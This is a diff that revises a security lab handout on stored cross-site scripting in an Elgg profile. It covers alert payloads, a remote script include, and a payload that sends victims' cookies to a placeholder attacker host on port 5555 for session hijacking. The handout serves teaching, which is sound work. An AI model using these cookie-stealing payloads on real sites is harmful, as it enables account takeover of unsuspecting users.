@@ -84,11 +84,13 @@ The "Brief Description" section will be rendered in other users' browsers when t
 
 - Try using the following JavaScript snippet to display an alert window in the browser of anyone visiting your profile page:
 ```
-<script>alert('XSS');</script>
+<script>alert('XSS is bad');</script>
 ```
-  If you embed the above JavaScript code in your profile (e.g. in the brief description field), then any user who views your profile will see the alert window.
+- After saving this, you will be returned to your profile page.  This shoud cause the browser to render this script and provide a pop-up alert. Try loggin out and testing this from an innocent victim's account.  
 
- In this case, the JavaScript code is short enough to be typed into the short description field. If you want to run a long JavaScript, but you are limited by the number of characters you can type in the form, you can store the JavaScript program in a standalone file, save it with the .js extension, and then refer to it using the src attribute in the \<script\> tag. See the following example:
+In this example, the JavaScript code is short enough to be typed into the short description field. If you want to run a longer JavaScript snippet, but you are limited by the number of characters you can type into the form, you can take a different approach. 
+
+Store the JavaScript program in a standalone file, save it with the .js extension, and then refer to it using the 'src' attribute in the <script> tag. See the following example:
 
 ```
 <script type="text/javascript"
@@ -97,27 +99,33 @@ src="http://www.example.com/myscripts.js">
 
 ```
 
-   In the above example, the page will fetch the JavaScript program from [http://www.example.com](http://www.example.com/), which can be any web server.
+In the above example, the page will fetch the JavaScript program from [http://www.example.com](http://www.example.com/), which can be any location that you have chosen to host this script at (attacker's web server for example).
 
 Task 2: Posting a Malicious Message to Display Cookies
 ===============
 
-   The objective of this task is to embed a JavaScript program in your Elgg profile, such that when another user views your profile, the user’s cookies  will be displayed in the alert window. This can be done by adding some additional code to the JavaScript program in the previous task:
+The objective of this task is to embed a JavaScript program in your Elgg profile, such that when another user views your profile, the user’s cookies  will be displayed in the alert window. This can be done by adding some additional code to the JavaScript program in the previous task.
+
+- Using the same process as before, try displaying the session cookie in the alert pop-up:
 
 ```
->   \<script\>alert(document.cookie);\</script\>
+<script>alert(document.cookie);</script>
 ```
 
 Task 3: Stealing Cookies from the Victim’s Machine
 ===============
 
-In the previous task, the malicious JavaScript code written by the attacker can print out the user’s cookies, but only the user can see the cookies, not the attacker. In this task, the attacker wants the JavaScript code to send the cookies to himself/herself. To achieve this, the malicious JavaScript code needs to send an HTTP request to the attacker, with the cookies appended to the request.
+In the previous task, the malicious JavaScript code displays the user’s cookie information, but only the user can see this cookies. This is not helpful to an attacker. In this task, the attacker will use JavaScript code to send the cookies to himself/herself, making them useful for session highjacking. To achieve this, the malicious JavaScript code needs to send an HTTP request to the attacker, with the cookie information appended to the request.
 
-We can do this by having the malicious JavaScript insert an *\<*img*\>* tag with its src attribute set to the attacker’s machine. When the JavaScript inserts the img tag, the browser tries to load the image from the URL in the src field; this results in an HTTP GET request sent to the attacker’s machine. The JavaScript given below sends the cookies to the port 5555 of the attacker’s machine, where the attacker has a TCP server listening to the same port. The server can print out whatever it receives. The TCP server program is in the echoserver directory on the attacker computer. Note that in the output, the = character gets transformed to %3D.
+We can do this by having the malicious JavaScript insert an *<*img*>* tag with its src attribute set to the attacker’s machine. When the JavaScript inserts the image (img) tag, the browser tries to load the image from the URL in the src field. This results in an HTTP GET request being sent to the attacker’s machine. 
+
+- The JavaScript snippet provided below sends the cookie information to port 5555 of the attacker’s machine, where the attacker has a TCP server listening to the same port. 
+
+- The TCP server program on the attacker's machine will print out what it recieved. The code for this application is in the echoserver directory on the attacker computer. 
+
+**Note that in the output, the "=" character gets transformed to %3D (hex).
 ```
-<script>document.write('<img src=http://attacker_IP_address:5555?c='
-+ escape(document.cookie) + ' >');
-</script>
+<script>document.write('<img src=http://attacker_IP_address:5555?c='+ escape(document.cookie) + ' >');</script>
 ```
 
 Task 4: Session Hijacking using the Stolen Cookies
